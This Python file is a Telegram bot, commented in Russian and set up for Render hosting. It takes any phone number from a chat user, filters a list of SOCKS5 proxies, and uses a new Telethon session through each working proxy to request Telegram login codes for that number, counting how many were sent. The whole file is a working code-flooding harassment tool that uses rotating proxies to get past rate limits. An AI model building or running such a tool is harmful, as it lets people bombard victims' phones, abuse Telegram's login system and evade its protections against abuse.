# d.py — финальная версия для Render (web service)
import os
import ssl
import socks
import socket
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor

from flask import Flask
from telethon import TelegramClient
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# ========== Настройки ==========
PROXIES_FILE = "proxies.txt"
OK_PROXIES_FILE = "ok_proxies.txt"
TCP_TIMEOUT = 1.0        # таймаут для TCP connect
SSL_TIMEOUT = 1.5        # таймаут для SSL handshake
WORKERS = 40             # параллельных потоков для проверки прокси
# =============================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID") or 0)
API_HASH = os.environ.get("API_HASH")

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise RuntimeError("Установите переменные окружения BOT_TOKEN, API_ID, API_HASH")

# --- чтение proxies.txt ---
def load_proxies(filename=PROXIES_FILE):
    proxies = []
    if not os.path.exists(filename):
        return proxies
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if not s:
                continue
            if s.startswith("socks5://"):
                s = s[len("socks5://"):]
            if ":" not in s:
                continue
            ip, port = s.split(":", 1)
            try:
                port = int(port)
            except Exception:
                continue
            proxies.append((ip.strip(), port))
    return proxies

# --- синхронная проверка одного proxy: TCP + SSL handshake ---
def check_proxy_sync(ip: str, port: int, tcp_timeout=TCP_TIMEOUT, ssl_timeout=SSL_TIMEOUT) -> bool:
    s = socks.socksocket()
    try:
        s.set_proxy(socks.SOCKS5, ip, port, rdns=True)
        s.settimeout(tcp_timeout)
        s.connect(("api.telegram.org", 443))
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

    try:
        s.settimeout(ssl_timeout)
        ctx = ssl.create_default_context()
        # если прокси MITM — handshake упадёт и мы пометим прокси как нерабочий
        ss = ctx.wrap_socket(s, server_hostname="api.telegram.org")
        ss.do_handshake()
        ss.close()
        return True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

# --- асинхронно фильтруем рабочие прокси быстро (параллельно) ---
async def filter_working_proxies(proxies, workers=WORKERS):
    if not proxies:
        return []
    loop = asyncio.get_running_loop()
    good = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        tasks = [loop.run_in_executor(ex, check_proxy_sync, ip, port) for ip, port in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    for (ip, port), r in zip(proxies, results):
        if r is True:
            good.append((ip, port))
    return good

# --- Telegram handlers (минимально информативно) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Пришли номер в формате +79998887766")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith("+") or not phone[1:].isdigit():
        await update.message.reply_text("Неверный формат. Пример: +79998887766")
        return

    msg = await update.message.reply_text("Принял. Быстро проверяю прокси...")
    proxies = load_proxies(PROXIES_FILE)
    good = await filter_working_proxies(proxies, workers=WORKERS)

    # сохранить рабочие
    with open(OK_PROXIES_FILE, "w", encoding="utf-8") as f:
        for ip, port in good:
            f.write(f"{ip}:{port}\n")

    sent = 0
    # отсылаем код через каждый рабочий прокси (если Telethon позволяет)
    for idx, (ip, port) in enumerate(good, start=1):
        proxy = (socks.SOCKS5, ip, port)
        session = f"session_{idx}"
        client = TelegramClient(session, API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                try:
                    await client.send_code_request(phone)
                    sent += 1
                except Exception:
                    # если Telethon вернул ошибку — пропускаем
                    pass
        except Exception:
            pass
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass

    await msg.edit_text(f"Готово. Рабочих прокси: {len(good)}. Кодов отправлено: {sent}.")

# --- создаём и запускаем бот ---
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    return app

def run_bot_bg(app):
    # Запускаем polling в отдельном потоке (daemon)
    app.run_polling()

# --- Flask чтобы Render видел открытый порт ---
flask_app = Flask(__name__)

@flask_app.route("/", methods=["GET"])
def index():
    return "OK", 200

def main():
    app = build_app()
    t = threading.Thread(target=run_bot_bg, args=(app,), daemon=True)
    t.start()

    port = int(os.environ.get("PORT", 5000))
    # Flask запускаем в основном потоке (Render проверит порт)
    flask_app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    main()
